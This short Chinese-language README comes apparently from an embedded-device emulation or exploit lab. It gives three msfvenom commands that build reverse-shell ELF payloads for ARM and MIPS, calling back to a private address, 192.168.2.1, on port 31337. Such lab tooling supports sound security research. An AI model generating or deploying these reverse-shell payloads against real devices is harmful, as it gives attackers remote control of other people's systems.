# Metasploit reverse shell

使用 Metasploit 生成的反向 shell，在写 exp 时复制到 `system-emu/tools` 目录下使用。

```sh
$ msfvenom -p linux/armle/shell_reverse_tcp LHOST=192.168.2.1 LPORT=31337 -f elf -o msf-arm
$ msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=192.168.2.1 LPORT=31337 -f elf -o msf-mipsel
$ msfvenom -p linux/mipsbe/shell_reverse_tcp LHOST=192.168.2.1 LPORT=31337 -f elf -o msf-mips
```
